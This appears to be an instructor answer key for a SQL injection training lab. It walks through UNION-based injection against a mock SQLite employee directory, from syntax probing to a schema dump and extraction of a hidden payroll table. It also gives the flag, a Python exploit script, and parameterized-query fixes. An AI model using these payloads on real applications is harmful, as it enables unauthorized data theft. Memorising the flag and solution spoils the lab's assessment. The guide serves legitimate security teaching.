# 🌐 Instructor Solution Guide: Incident 0404 (Corporate Directory AppSec)

### Web Application Penetration Testing: UNION-Based SQL Injection & Parameterized Remediation

---

## 📌 Executive Summary

| Parameter                        | Details                                                                  |
| :------------------------------- | :----------------------------------------------------------------------- |
| **Incident ID**                  | `INC-0404-SQLI-PORTAL`                                                   |
| **Target Application**           | Corporate Employee Directory (`/api/search?q=`)                          |
| **Vulnerability Classification** | **CWE-89**: SQL Injection \| **OWASP Top 10**: A03:2021 (Injection)      |
| **MITRE ATT&CK Technique**       | **T1190**: Exploit Public-Facing Application                             |
| **Underlying Database**          | SQLite 3 (`data/corp_directory.db`)                                      |
| **Vulnerable Parameter**         | `q` (HTTP GET search parameter concatenated directly into SQL statement) |
| **Target Data Extracted**        | Table `payroll_audit` (confidential executive bonus records)             |
| **Recovered Incident Flag**      | `FLAG{sqli_union_payroll_leak_pwned}`                                    |

During an internal application security assessment, security auditors identified that the employee search functionality in the corporate intranet portal concatenated untrusted user inputs directly into dynamic SQL queries without parameterized bindings or input sanitization. This allowed an unauthenticated attacker to inject UNION-based SQL statements, dump the internal database schema (`sqlite_master`), and exfiltrate confidential records from the restricted `payroll_audit` table.

---

## 🎯 Exploitation Methodology: Step-by-Step

Follow these sequential steps in the interactive Marimo notebook or in your penetration testing proxy (e.g., Burp Suite / curl):

### Step 1: Baseline Query & Input Syntax Error Probing

1. **Test Normal Application Behavior**:
   - In **Step 1: Interactive SQL Injection Console**, set the `Methodology Preset:` dropdown to:
     `1. Standard Search: 'Alice'`
   - The application executes:
     ```sql
     SELECT id, name, department, email FROM employees WHERE name LIKE '%Alice%'
     ```
   - Result: 1 row returned for `Alice Smith`.
2. **Inject Single Quote Syntax Probe**:
   - Change `Methodology Preset:` to:
     `2. Syntax Error Probe: '''`
   - The application constructs:
     ```sql
     SELECT id, name, department, email FROM employees WHERE name LIKE '%'%'
     ```
   - **Database Error Triggered**:
     ```text
     sqlite3.OperationalError: unrecognized token: "'''"
     ```
   - _Key Analyst Insight_: The database syntax error confirms that user input is directly concatenated into the SQL command interpreter rather than bound as a parameter.

---

### Step 2: Boolean Tautology Authentication Bypass Test

1. **Inject Boolean Tautology**:
   - Set `Methodology Preset:` to:
     `3. Boolean Filter Bypass: ''' OR 1=1 --'`
   - The constructed query becomes:
     ```sql
     SELECT id, name, department, email FROM employees WHERE name LIKE '%' OR 1=1 --%'
     ```
2. **Observe the Results**:
   - The comment operator (`--`) truncates the remaining closing single quote and wildcard (`%'`).
   - Because `1=1` is always true, the database returns all 4 employee records in the company directory (`Alice`, `Bob`, `Charlie`, `Dana`), demonstrating unauthorized data extraction.

---

### Step 3: Column Count Enumeration (UNION Injection)

1. **Align UNION Column Counts**:
   - A `UNION SELECT` statement requires the injected query to have the **exact same number of columns** as the original query (`SELECT id, name, department, email ...` = 4 columns).
   - Test 4 columns by selecting:
     `4. Column Count Enumeration: ''' UNION SELECT 1, 2, 3, 4 --'`
   - The constructed query becomes:
     ```sql
     SELECT id, name, department, email FROM employees WHERE name LIKE '%' UNION SELECT 1, 2, 3, 4 --%'
     ```
2. **Verify Output**:
   - The query succeeds with code `200 OK` and renders an extra row with dummy values `1 | 2 | 3 | 4`.
   - This proves that the query width is 4 columns and that positions 1, 2, 3, and 4 are all displayed in the output table.

---

### Step 4: Schema Discovery via `sqlite_master`

1. **Construct Custom Schema Enumeration Payload**:
   - In SQLite, all table definitions and schemas are cataloged in the internal metadata table `sqlite_master`.
   - In the `Methodology Preset:` dropdown, select **`Custom Injection Query`**.
   - In the `SQL Injection Input:` text box, enter:
     ```sql
     ' UNION SELECT 1, sql, tbl_name, 4 FROM sqlite_master --
     ```
   - Constructed backend query:
     ```sql
     SELECT id, name, department, email FROM employees WHERE name LIKE '%' UNION SELECT 1, sql, tbl_name, 4 FROM sqlite_master --%'
     ```
2. **Review Extracted Tables**:
   - The query reveals the database tables in the returned table view:
     1. `CREATE TABLE employees (id INTEGER PRIMARY KEY, name TEXT, department TEXT, email TEXT)`
     2. `CREATE TABLE payroll_audit (id INTEGER PRIMARY KEY, employee_id INT, notes TEXT, flag TEXT)`
   - The hidden table `payroll_audit` contains 4 columns: `id`, `employee_id`, `notes`, and `flag`!

---

### Step 5: Data Exfiltration from `payroll_audit`

1. **Extract Confidential Payroll Audit Records**:
   - Keeping `Custom Injection Query` selected, update the input box to target the discovered table:
     ```sql
     ' UNION SELECT id, employee_id, notes, flag FROM payroll_audit --
     ```
   - Constructed backend query:
     ```sql
     SELECT id, name, department, email FROM employees WHERE name LIKE '%' UNION SELECT id, employee_id, notes, flag FROM payroll_audit --%'
     ```
2. **Analyze the Exfiltrated Rows**:
   - **Col 1 (id)**: `1`
   - **Col 2 (employee_id)**: `4`
   - **Col 3 (notes)**: `Executive bonus disbursement verification`
   - **Col 4 (flag)**: **`FLAG{sqli_union_payroll_leak_pwned}`**

---

### Step 6: Flag Verification & Submission

1. **Verify the Flag in the Notebook**:
   - Scroll to **Step 3: Verify Exfiltrated Incident Flag & Audit Report**.
   - Enter: `FLAG{sqli_union_payroll_leak_pwned}`.
   - The workbench validates the candidate flag using one-way cryptographic SHA-256 verification (`c59b621f2c5385234123519cca4e7cce0a51f1280fbdc9466d8a028dfb5371ba`), preventing plaintext answers from being inspected in the notebook code.
   - Confirm the green notification card: `🎉 FLAG VERIFIED CORRECT!`.
   - Upon correct verification, the confirmed **Vulnerability Assessment Report** unlocks below the input box.
2. **Submit to Portal**:
   - Enter `FLAG{sqli_union_payroll_leak_pwned}` into the CyberLab portal pane to score 150 points and validate your Web Security competency.

---

## 🐍 Standalone Python Exploitation Script

To demonstrate the full exploitation pipeline programmatically using Python `sqlite3`:

```python
import sqlite3
from pathlib import Path

# Connect to target SQLite database
db_path = Path("data/corp_directory.db")
conn = sqlite3.connect(db_path)
cur = conn.cursor()

# Exploit payload: UNION SELECT against payroll_audit
payload = "' UNION SELECT id, employee_id, notes, flag FROM payroll_audit --"
vulnerable_query = f"SELECT id, name, department, email FROM employees WHERE name LIKE '%{payload}%'"

cur.execute(vulnerable_query)
for row in cur.fetchall():
    if "FLAG{" in str(row):
        print(f"[+] Leaked Sensitive Row: {row}")
```

---

## 🛡️ Secure Code Remediation (Parameterized Queries)

### The Underlying Flaw: Dynamic String Concatenation

```python
# ❌ VULNERABLE CODE (Python / SQLite):
# Any single quotes or SQL commands in 'q' alter query logic:
query = f"SELECT id, name, department, email FROM employees WHERE name LIKE '%{q}%'"
cursor.execute(query)
```

### The Correct Fix: Parameterized Prepared Statements

When parameterized queries (prepared statements) are used, the database pre-compiles the query structure. User input is supplied separately as data parameters, making SQL injection mathematically impossible regardless of whether quotes or commands are entered:

```python
# ✅ SECURE CODE (Python DB-API / SQLite):
# The question mark (?) is a placeholder; input is treated strictly as data:
query = "SELECT id, name, department, email FROM employees WHERE name LIKE ?"
cursor.execute(query, (f"%{q}%",))
```

### Defense-in-Depth Measures

1. **Least Privilege**: The web application database account should only have `SELECT` permissions on `employees`, with zero access to `payroll_audit`.
2. **Web Application Firewall (WAF)**: Deploy rules detecting SQL keywords (`UNION`, `SELECT`, `sqlite_master`, `--`) in query parameters.
3. **ORM Frameworks**: Utilize secure Object-Relational Mappers (e.g., SQLAlchemy, Django ORM) that enforce parameterized queries by default.
